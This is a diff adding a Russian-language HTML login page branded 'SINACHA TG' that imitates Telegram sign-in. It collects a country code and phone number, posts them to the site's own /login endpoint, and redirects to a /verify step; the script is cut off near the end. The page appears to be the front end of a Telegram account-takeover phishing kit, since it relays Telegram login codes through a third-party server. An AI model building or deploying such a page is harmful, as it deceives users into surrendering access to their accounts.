@@ -1,0 +1,997 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SINACHA TG</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #00ff88;
+            --primary-dark: #00cc6a;
+            --secondary-color: #00ffcc;
+            --accent-color: #66ffee;
+            --background-color: #0a0f1a;
+            --card-background: rgba(16, 23, 42, 0.98);
+            --success-color: #00ff88;
+            --error-color: #ff3366;
+            --warning-color: #ffaa00;
+            --text-color: #ffffff;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: var(--background-color);
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 20%, rgba(0, 255, 136, 0.05) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(0, 255, 204, 0.05) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0;
+            animation: gradientMove 20s ease-in-out infinite;
+        }
+
+        @keyframes gradientMove {
+            0% {
+                background-position: 0% 0%;
+                transform: scale(1);
+            }
+            50% {
+                background-position: 100% 100%;
+                transform: scale(1.1);
+            }
+            100% {
+                background-position: 0% 0%;
+                transform: scale(1);
+            }
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            z-index: 1;
+            position: relative;
+        }
+
+        .card {
+            background: var(--card-background);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 28px;
+            padding: 2.5rem;
+            width: 100%;
+            max-width: 380px;
+            box-shadow: 
+                0 8px 32px rgba(0, 0, 0, 0.2),
+                0 0 0 1px rgba(255, 255, 255, 0.1);
+            transform: translateY(0);
+            transition: all 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+            backdrop-filter: blur(10px);
+            animation: scaleIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 2rem;
+            position: relative;
+            z-index: 1;
+        }
+
+        .logo-container::before {
+            content: '';
+            position: absolute;
+            width: 150px;
+            height: 150px;
+            background: radial-gradient(circle, 
+                rgba(0, 255, 136, 0.1) 0%,
+                transparent 70%
+            );
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation: pulse-glow 3s ease-in-out infinite;
+            z-index: -1;
+        }
+
+        @keyframes pulse-glow {
+            0% { 
+                transform: translate(-50%, -50%) scale(0.8); opacity: 0.5; 
+            }
+            50% { 
+                transform: translate(-50%, -50%) scale(1.2); opacity: 0.8; 
+            }
+            100% { 
+                transform: translate(-50%, -50%) scale(0.8); opacity: 0.5; 
+            }
+        }
+
+        .logo {
+            width: 90px;
+            height: 90px;
+            margin: 0 auto;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            border-radius: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            transition: all 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+            box-shadow: 0 8px 32px rgba(0, 255, 136, 0.2);
+            animation: fadeIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) 0.2s both;
+        }
+
+        .logo i {
+            font-size: 2.5rem;
+            color: var(--background-color);
+            transition: all 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .logo:hover {
+            transform: scale(1.05);
+            box-shadow: 0 12px 40px rgba(0, 255, 136, 0.3);
+        }
+
+        .logo:hover i {
+            transform: scale(1.1) rotate(10deg);
+        }
+
+        .logo::before,
+        .logo::after {
+            content: '';
+            position: absolute;
+            inset: -2px;
+            border-radius: inherit;
+            background: linear-gradient(
+                45deg,
+                var(--primary-color),
+                var(--secondary-color),
+                var(--accent-color),
+                var(--primary-color)
+            );
+            background-size: 400% 400%;
+            animation: borderRotate 8s linear infinite;
+            z-index: -1;
+        }
+
+        .logo::after {
+            filter: blur(10px);
+            opacity: 0.3;
+        }
+
+        @keyframes borderRotate {
+            0% { background-position: 0% 0%; }
+            100% { background-position: 400% 0%; }
+        }
+
+        .title {
+            color: var(--text-color);
+            font-size: 2rem;
+            font-weight: 700;
+            margin: 1.5rem 0 0.5rem;
+            text-align: center;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            -webkit-text-fill-color: transparent;
+            position: relative;
+            display: inline-block;
+            animation: fadeIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) 0.4s both;
+        }
+
+        .title::after {
+            content: attr(data-text);
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            -webkit-text-fill-color: transparent;
+            opacity: 0;
+            animation: glitch 5s infinite;
+        }
+
+        @keyframes glitch {
+            0% { 
+                transform: translate(0);
+                opacity: 0;
+            }
+            2% { 
+                transform: translate(-2px, 2px);
+                opacity: 0.6;
+            }
+            4% { 
+                transform: translate(2px, -2px);
+                opacity: 0.6;
+            }
+            6% { 
+                transform: translate(0);
+                opacity: 0;
+            }
+            100% { 
+                transform: translate(0);
+                opacity: 0;
+            }
+        }
+
+        .subtitle {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 1rem;
+            text-align: center;
+            margin-bottom: 2rem;
+            position: relative;
+            overflow: hidden;
+            animation: fadeIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) 0.6s both;
+        }
+
+        .subtitle::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            bottom: -2px;
+            width: 100%;
+            height: 1px;
+            background: linear-gradient(90deg,
+                transparent,
+                var(--primary-color),
+                transparent
+            );
+            animation: slideLine 3s ease-in-out infinite;
+        }
+
+        @keyframes slideLine {
+            0% { transform: translateX(-100%); }
+            50% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
+
+        .status-widget {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.875rem;
+            color: var(--text-color);
+            opacity: 0.8;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--primary-color);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.5); opacity: 0.5; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .form-group {
+            margin-bottom: 1.75rem;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 0.625rem;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 0.875rem;
+            font-weight: 500;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 1.125rem;
+            font-size: 1.125rem;
+            pointer-events: none;
+            transition: all 0.3s ease;
+            z-index: 1;
+        }
+
+        .icon-globe {
+            background: linear-gradient(45deg, #3498db, #2ecc71);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            opacity: 0.9;
+        }
+
+        .icon-phone {
+            background: linear-gradient(45deg, #e74c3c, #f1c40f);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            opacity: 0.9;
+        }
+
+        .form-group select,
+        .form-group input {
+            width: 100%;
+            height: 3.25rem;
+            padding: 0 1.125rem 0 3rem;
+            background: rgba(16, 23, 42, 0.95);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            border-radius: 16px;
+            color: var(--text-color);
+            font-size: 1rem;
+            font-weight: 400;
+            letter-spacing: 0.01em;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+
+        .custom-select-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        .custom-select-options {
+            position: absolute;
+            top: calc(100% + 8px);
+            left: 0;
+            right: 0;
+            background: rgba(16, 23, 42, 0.98);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            max-height: 0;
+            overflow: hidden;
+            opacity: 0;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            z-index: 1000;
+        }
+
+        .custom-select-options.active {
+            max-height: 300px;
+            opacity: 1;
+            overflow-y: auto;
+        }
+
+        .custom-option {
+            padding: 0.875rem 1.25rem;
+            color: #fff;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            opacity: 0;
+            transform: translateY(-10px);
+        }
+
+        .custom-select-options.active .custom-option {
+            opacity: 1;
+            transform: translateY(0);
+            animation: optionSlideIn 0.3s ease forwards;
+        }
+
+        .custom-option:hover {
+            background: linear-gradient(45deg, rgba(52, 152, 219, 0.2), rgba(46, 204, 113, 0.2));
+        }
+
+        .custom-option.selected {
+            background: linear-gradient(45deg, rgba(52, 152, 219, 0.3), rgba(46, 204, 113, 0.3));
+        }
+
+        @keyframes optionSlideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Стилизация скроллбара */
+        .custom-select-options::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .custom-select-options::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 3px;
+        }
+
+        .custom-select-options::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 3px;
+        }
+
+        .custom-select-options::-webkit-scrollbar-thumb:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+
+        .form-group select:hover,
+        .form-group input:hover {
+            border-color: rgba(255, 255, 255, 0.2);
+            background-color: rgba(16, 23, 42, 0.98);
+        }
+
+        .form-group select:focus,
+        .form-group input:focus {
+            outline: none;
+            border-color: rgba(255, 255, 255, 0.3);
+            background-color: rgba(16, 23, 42, 1);
+            box-shadow: 
+                0 4px 16px rgba(0, 0, 0, 0.2),
+                0 0 0 1px rgba(255, 255, 255, 0.15);
+        }
+
+        .form-group select:focus + .input-icon,
+        .form-group input:focus + .input-icon {
+            color: var(--primary-color);
+        }
+
+        .form-group:hover .input-icon {
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .form-group input::placeholder {
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 0.9375rem;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 0.875rem;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: var(--background-color);
+            border: none;
+            border-radius: 16px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            animation: fadeIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) 1s both;
+            position: relative;
+            overflow: hidden;
+            transform: scale(1);
+        }
+
+        .btn:hover {
+            transform: scale(1.02);
+        }
+
+        .btn:active {
+            transform: scale(0.98);
+        }
+
+        .btn .btn-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: all 0.3s ease;
+        }
+
+        .btn .spinner {
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            opacity: 0;
+            transition: all 0.3s ease;
+        }
+
+        .btn.loading .btn-content {
+            opacity: 0;
+        }
+
+        .btn.loading .spinner {
+            transform: translate(-50%, -50%) scale(1);
+            opacity: 1;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 2rem;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: var(--card-background);
+            border: 1px solid var(--primary-color);
+            padding: 1rem 2rem;
+            border-radius: 12px;
+            color: var(--text-color);
+            font-weight: 500;
+            opacity: 0;
+            transition: all 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+        }
+
+        .toast.show {
+            transform: translateX(-50%) translateY(0);
+            opacity: 1;
+        }
+
+        .toast.success {
+            border-color: var(--primary-color);
+        }
+
+        .toast.success::before {
+            content: '✓';
+            color: var(--primary-color);
+            font-weight: bold;
+        }
+
+        .toast.error {
+            border-color: var(--error-color);
+        }
+
+        .toast.error::before {
+            content: '✕';
+            color: var(--error-color);
+            font-weight: bold;
+        }
+
+        .progress-bar {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            height: 2px;
+            background: var(--primary-color);
+            width: 100%;
+            transform: scaleX(0);
+            transform-origin: left;
+            transition: transform 3s linear;
+        }
+
+        .toast.show .progress-bar {
+            transform: scaleX(1);
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes scaleIn {
+            from {
+                opacity: 0;
+                transform: scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 1rem 1.5rem;
+            border-radius: 12px;
+            background: rgba(16, 23, 42, 0.95);
+            color: #fff;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            transform: translateX(150%);
+            opacity: 0;
+            transition: all 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            z-index: 1000;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .notification.show {
+            transform: translateX(0);
+            opacity: 1;
+        }
+
+        .notification i {
+            font-size: 1.25rem;
+        }
+
+        .notification.error {
+            border-left: 4px solid #e74c3c;
+        }
+
+        .notification.error i {
+            color: #e74c3c;
+        }
+
+        .notification.success {
+            border-left: 4px solid #2ecc71;
+        }
+
+        .notification.success i {
+            color: #2ecc71;
+        }
+
+        @keyframes fieldError {
+            0% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            50% { transform: translateX(5px); }
+            75% { transform: translateX(-5px); }
+            100% { transform: translateX(0); }
+        }
+
+        .field-error {
+            animation: fieldError 0.4s ease;
+            border-color: #e74c3c !important;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="status-widget">
+                <div class="status-dot"></div>
+                <span>Online</span>
+            </div>
+            <div class="logo-container">
+                <div class="logo">
+                    <i class="fab fa-telegram-plane"></i>
+                </div>
+                <h1 class="title" data-text="SINACHA TG">SINACHA TG</h1>
+                <p class="subtitle">Войдите в свой аккаунт Telegram</p>
+            </div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="country">Выберите страну</label>
+                    <div class="custom-select-wrapper">
+                        <div class="input-wrapper">
+                            <i class="fas fa-globe input-icon icon-globe"></i>
+                            <input type="text" 
+                                   id="selectedCountry" 
+                                   readonly 
+                                   placeholder="Выберите страну"
+                                   class="form-control"
+                                   value="Россия (+7)">
+                        </div>
+                        <div class="custom-select-options">
+                            <div class="custom-option" data-value="+93" data-name="Афганистан (+93)">Афганистан (+93)</div>
+                            <div class="custom-option" data-value="+355" data-name="Албания (+355)">Албания (+355)</div>
+                            <div class="custom-option" data-value="+213" data-name="Алжир (+213)">Алжир (+213)</div>
+                            <div class="custom-option" data-value="+244" data-name="Ангола (+244)">Ангола (+244)</div>
+                            <div class="custom-option" data-value="+374" data-name="Армения (+374)">Армения (+374)</div>
+                            <div class="custom-option" data-value="+61" data-name="Австралия (+61)">Австралия (+61)</div>
+                            <div class="custom-option" data-value="+43" data-name="Австрия (+43)">Австрия (+43)</div>
+                            <div class="custom-option" data-value="+994" data-name="Азербайджан (+994)">Азербайджан (+994)</div>
+                            <div class="custom-option" data-value="+375" data-name="Беларусь (+375)">Беларусь (+375)</div>
+                            <div class="custom-option" data-value="+32" data-name="Бельгия (+32)">Бельгия (+32)</div>
+                            <div class="custom-option" data-value="+591" data-name="Боливия (+591)">Боливия (+591)</div>
+                            <div class="custom-option" data-value="+55" data-name="Бразилия (+55)">Бразилия (+55)</div>
+                            <div class="custom-option" data-value="+359" data-name="Болгария (+359)">Болгария (+359)</div>
+                            <div class="custom-option" data-value="+855" data-name="Камбоджа (+855)">Камбоджа (+855)</div>
+                            <div class="custom-option" data-value="+1" data-name="Канада (+1)">Канада (+1)</div>
+                            <div class="custom-option" data-value="+236" data-name="ЦАР (+236)">ЦАР (+236)</div>
+                            <div class="custom-option" data-value="+56" data-name="Чили (+56)">Чили (+56)</div>
+                            <div class="custom-option" data-value="+86" data-name="Китай (+86)">Китай (+86)</div>
+                            <div class="custom-option" data-value="+57" data-name="Колумбия (+57)">Колумбия (+57)</div>
+                            <div class="custom-option" data-value="+53" data-name="Куба (+53)">Куба (+53)</div>
+                            <div class="custom-option" data-value="+45" data-name="Дания (+45)">Дания (+45)</div>
+                            <div class="custom-option" data-value="+20" data-name="Египет (+20)">Египет (+20)</div>
+                            <div class="custom-option" data-value="+372" data-name="Эстония (+372)">Эстония (+372)</div>
+                            <div class="custom-option" data-value="+251" data-name="Эфиопия (+251)">Эфиопия (+251)</div>
+                            <div class="custom-option" data-value="+358" data-name="Финляндия (+358)">Финляндия (+358)</div>
+                            <div class="custom-option" data-value="+33" data-name="Франция (+33)">Франция (+33)</div>
+                            <div class="custom-option" data-value="+995" data-name="Грузия (+995)">Грузия (+995)</div>
+                            <div class="custom-option" data-value="+49" data-name="Германия (+49)">Германия (+49)</div>
+                            <div class="custom-option" data-value="+30" data-name="Греция (+30)">Греция (+30)</div>
+                            <div class="custom-option" data-value="+36" data-name="Венгрия (+36)">Венгрия (+36)</div>
+                            <div class="custom-option" data-value="+354" data-name="Исландия (+354)">Исландия (+354)</div>
+                            <div class="custom-option" data-value="+91" data-name="Индия (+91)">Индия (+91)</div>
+                            <div class="custom-option" data-value="+62" data-name="Индонезия (+62)">Индонезия (+62)</div>
+                            <div class="custom-option" data-value="+98" data-name="Иран (+98)">Иран (+98)</div>
+                            <div class="custom-option" data-value="+964" data-name="Ирак (+964)">Ирак (+964)</div>
+                            <div class="custom-option" data-value="+353" data-name="Ирландия (+353)">Ирландия (+353)</div>
+                            <div class="custom-option" data-value="+972" data-name="Израиль (+972)">Израиль (+972)</div>
+                            <div class="custom-option" data-value="+39" data-name="Италия (+39)">Италия (+39)</div>
+                            <div class="custom-option" data-value="+81" data-name="Япония (+81)">Япония (+81)</div>
+                            <div class="custom-option" data-value="+962" data-name="Иордания (+962)">Иордания (+962)</div>
+                            <div class="custom-option" data-value="+7" data-name="Казахстан (+7)">Казахстан (+7)</div>
+                            <div class="custom-option" data-value="+254" data-name="Кения (+254)">Кения (+254)</div>
+                            <div class="custom-option" data-value="+82" data-name="Корея (+82)">Корея (+82)</div>
+                            <div class="custom-option" data-value="+965" data-name="Кувейт (+965)">Кувейт (+965)</div>
+                            <div class="custom-option" data-value="+996" data-name="Кыргызстан (+996)">Кыргызстан (+996)</div>
+                            <div class="custom-option" data-value="+856" data-name="Лаос (+856)">Лаос (+856)</div>
+                            <div class="custom-option" data-value="+371" data-name="Латвия (+371)">Латвия (+371)</div>
+                            <div class="custom-option" data-value="+961" data-name="Ливан (+961)">Ливан (+961)</div>
+                            <div class="custom-option" data-value="+218" data-name="Ливия (+218)">Ливия (+218)</div>
+                            <div class="custom-option" data-value="+370" data-name="Литва (+370)">Литва (+370)</div>
+                            <div class="custom-option" data-value="+352" data-name="Люксембург (+352)">Люксембург (+352)</div>
+                            <div class="custom-option" data-value="+389" data-name="Македония (+389)">Македония (+389)</div>
+                            <div class="custom-option" data-value="+261" data-name="Мадагаскар (+261)">Мадагаскар (+261)</div>
+                            <div class="custom-option" data-value="+60" data-name="Малайзия (+60)">Малайзия (+60)</div>
+                            <div class="custom-option" data-value="+356" data-name="Мальта (+356)">Мальта (+356)</div>
+                            <div class="custom-option" data-value="+52" data-name="Мексика (+52)">Мексика (+52)</div>
+                            <div class="custom-option" data-value="+373" data-name="Молдова (+373)">Молдова (+373)</div>
+                            <div class="custom-option" data-value="+976" data-name="Монголия (+976)">Монголия (+976)</div>
+                            <div class="custom-option" data-value="+212" data-name="Марокко (+212)">Марокко (+212)</div>
+                            <div class="custom-option" data-value="+95" data-name="Мьянма (+95)">Мьянма (+95)</div>
+                            <div class="custom-option" data-value="+977" data-name="Непал (+977)">Непал (+977)</div>
+                            <div class="custom-option" data-value="+31" data-name="Нидерланды (+31)">Нидерланды (+31)</div>
+                            <div class="custom-option" data-value="+64" data-name="Новая Зеландия (+64)">Новая Зеландия (+64)</div>
+                            <div class="custom-option" data-value="+234" data-name="Нигерия (+234)">Нигерия (+234)</div>
+                            <div class="custom-option" data-value="+47" data-name="Норвегия (+47)">Норвегия (+47)</div>
+                            <div class="custom-option" data-value="+968" data-name="Оман (+968)">Оман (+968)</div>
+                            <div class="custom-option" data-value="+92" data-name="Пакистан (+92)">Пакистан (+92)</div>
+                            <div class="custom-option" data-value="+507" data-name="Панама (+507)">Панама (+507)</div>
+                            <div class="custom-option" data-value="+595" data-name="Парагвай (+595)">Парагвай (+595)</div>
+                            <div class="custom-option" data-value="+51" data-name="Перу (+51)">Перу (+51)</div>
+                            <div class="custom-option" data-value="+63" data-name="Филиппины (+63)">Филиппины (+63)</div>
+                            <div class="custom-option" data-value="+48" data-name="Польша (+48)">Польша (+48)</div>
+                            <div class="custom-option" data-value="+351" data-name="Португалия (+351)">Португалия (+351)</div>
+                            <div class="custom-option" data-value="+974" data-name="Катар (+974)">Катар (+974)</div>
+                            <div class="custom-option" data-value="+40" data-name="Румыния (+40)">Румыния (+40)</div>
+                            <div class="custom-option" data-value="+7" data-name="Россия (+7)">Россия (+7)</div>
+                            <div class="custom-option" data-value="+966" data-name="Саудовская Аравия (+966)">Саудовская Аравия (+966)</div>
+                            <div class="custom-option" data-value="+381" data-name="Сербия (+381)">Сербия (+381)</div>
+                            <div class="custom-option" data-value="+65" data-name="Сингапур (+65)">Сингапур (+65)</div>
+                            <div class="custom-option" data-value="+421" data-name="Словакия (+421)">Словакия (+421)</div>
+                            <div class="custom-option" data-value="+386" data-name="Словения (+386)">Словения (+386)</div>
+                            <div class="custom-option" data-value="+27" data-name="ЮАР (+27)">ЮАР (+27)</div>
+                            <div class="custom-option" data-value="+34" data-name="Испания (+34)">Испания (+34)</div>
+                            <div class="custom-option" data-value="+94" data-name="Шри-Ланка (+94)">Шри-Ланка (+94)</div>
+                            <div class="custom-option" data-value="+249" data-name="Судан (+249)">Судан (+249)</div>
+                            <div class="custom-option" data-value="+46" data-name="Швеция (+46)">Швеция (+46)</div>
+                            <div class="custom-option" data-value="+41" data-name="Швейцария (+41)">Швейцария (+41)</div>
+                            <div class="custom-option" data-value="+963" data-name="Сирия (+963)">Сирия (+963)</div>
+                            <div class="custom-option" data-value="+886" data-name="Тайвань (+886)">Тайвань (+886)</div>
+                            <div class="custom-option" data-value="+992" data-name="Таджикистан (+992)">Таджикистан (+992)</div>
+                            <div class="custom-option" data-value="+66" data-name="Таиланд (+66)">Таиланд (+66)</div>
+                            <div class="custom-option" data-value="+216" data-name="Тунис (+216)">Тунис (+216)</div>
+                            <div class="custom-option" data-value="+90" data-name="Турция (+90)">Турция (+90)</div>
+                            <div class="custom-option" data-value="+993" data-name="Туркменистан (+993)">Туркменистан (+993)</div>
+                            <div class="custom-option" data-value="+380" data-name="Украина (+380)">Украина (+380)</div>
+                            <div class="custom-option" data-value="+971" data-name="ОАЭ (+971)">ОАЭ (+971)</div>
+                            <div class="custom-option" data-value="+44" data-name="Великобритания (+44)">Великобритания (+44)</div>
+                            <div class="custom-option" data-value="+1" data-name="США (+1)">США (+1)</div>
+                            <div class="custom-option" data-value="+598" data-name="Уругвай (+598)">Уругвай (+598)</div>
+                            <div class="custom-option" data-value="+998" data-name="Узбекистан (+998)">Узбекистан (+998)</div>
+                            <div class="custom-option" data-value="+58" data-name="Венесуэла (+58)">Венесуэла (+58)</div>
+                            <div class="custom-option" data-value="+84" data-name="Вьетнам (+84)">Вьетнам (+84)</div>
+                            <div class="custom-option" data-value="+967" data-name="Йемен (+967)">Йемен (+967)</div>
+                            <div class="custom-option" data-value="+260" data-name="Замбия (+260)">Замбия (+260)</div>
+                            <div class="custom-option" data-value="+263" data-name="Зимбабве (+263)">Зимбабве (+263)</div>
+                        </div>
+                        <input type="hidden" id="country" name="country" value="+7">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="phone">Номер телефона</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-phone input-icon icon-phone"></i>
+                        <input type="tel" 
+                               id="phone" 
+                               placeholder="(999) 123-45-67"
+                               required
+                               autocomplete="tel"
+                               oninput="formatPhoneNumber(this)"
+                               onkeypress="return event.charCode >= 48 && event.charCode <= 57">
+                    </div>
+                </div>
+
+                <button type="submit" class="btn" id="loginButton">
+                    <div class="btn-content">
+                        <i class="fas fa-sign-in-alt"></i>
+                        <span id="btnText">Войти</span>
+                    </div>
+                    <div class="spinner"></div>
+                </button>
+            </form>
+
+            <div id="status" class="toast">
+                <div class="progress-bar"></div>
+            </div>
+
+            <div class="notification error">
+                <i class="fas fa-exclamation-circle"></i>
+                <span class="notification-message"></span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function updatePhoneNumber() {
+            const phoneInput = document.getElementById('phone');
+            formatPhoneNumber(phoneInput);
+        }
+
+        function formatPhoneNumber(input) {
+            let value = input.value.replace(/\D/g, '');
+            
+            if (value.length === 0) {
+                input.value = '';
+                return;
+            }
+
+            let formattedNumber = '';
+            
+            if (value.length > 0) {
+                formattedNumber += '(' + value.substring(0, Math.min(3, value.length));
+            }
+            if (value.length > 3) {
+                formattedNumber += ') ' + value.substring(3, Math.min(6, value.length));
+            }
+            if (value.length > 6) {
+                formattedNumber += '-' + value.substring(6, Math.min(8, value.length));
+            }
+            if (value.length > 8) {
+                formattedNumber += '-' + value.substring(8, Math.min(10, value.length));
+            }
+            
+            input.value = formattedNumber;
+        }
+
+        async function handleLogin(event) {
+            event.preventDefault();
+            
+            const button = document.getElementById('loginButton');
+            const phone = document.getElementById('phone').value;
+
+            if (!phone) {
+                showNotification('Пожалуйста, введите номер телефона', 'error');
+                return;
+            }
+
+            button.disabled = true;
+            button.textContent = 'Отправка...';
+
+            try {
+                const response = await fetch('/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ phone: phone })
+                });
+
+                const data = await response.json();
+
+                if (response.status === 429) {  // Too Many Requests
+                    showNotification(data.error, 'error');
+                    // Сохраняем время следующей попытки
+                    localStorage.setItem('nextLoginAttempt', Date.now() + (data.wait_seconds * 1000));
+                    updateLoginTimer();
+                } else if (data.success) {
+                    showNotification('Код отправлен! Проверьте ваш Telegram.', 'success');
+                    setTimeout(() => {
+                        window.location.href = '/verify';
+                    }, 1000);
+                } else {
+                    if (data.error.includes('phone code expired')) {
+                        showNotification('Код подтверждения истек. Пожалуйста, запросите новый код.');
+                    } else {
+                        showNotification(data.error || 'Произошла ошибка при отправке кода', 'error');
+                    }
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showNotification('Ошибка при подключении к серверу', 'error');
+            } finally {
+                if (!localStorage.getItem('nextLoginAttempt')) {
+                    button.disabled = false;
+                    button.textContent = 'Войти';
+                }
+            }
+        }
+
+        function updateLoginTimer() {
+            const nextAttempt = parseInt(localStorage.getItem('nextLoginAttempt'));
+            if (!nextAttempt) return;
+            
+            const now = Date.now();
+            const remainingMs = nextAttempt - now;
+            
+            if (remainingMs <= 0) {
+                // Время ожидания истекло
+                document.getElementById('loginButton').disabled = false;
+                document.getElementById('loginButton').textContent = 'Войти';
+                localStorage.removeItem('nextLoginAttempt');
+                return;
+            }
+            
+            // Обновляем текст кнопки
+            const remainingSeconds = Math.ceil(remainingMs / 1000);
+            const hours = Math.floor(remainingSeconds / 3600);
+            const minutes = Math.floor((remainingSeconds % 3600) / 60);
+            const seconds = remainingSeconds % 60;
+            
+            const timeString = `${hours}ч ${minutes}м ${seconds}с`;
+            document.getElementById('loginButton').textContent = `Подождите ${timeString}`;
+            
+            // Обновляем каждую секунду
+            setTimeout(updateLoginTimer, 1000);
+        }
+
+        function showNotification(message, type = 'error') {
+            const notification = document.querySelector('.notification');
+            const messageEl = notification.querySelector('.notification-message');
+            
+            notification.className = 'notification ' + type;
+            messageEl.textContent = message;
+            
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+
+        // При загрузке страницы проверяем, нужно ли показать таймер
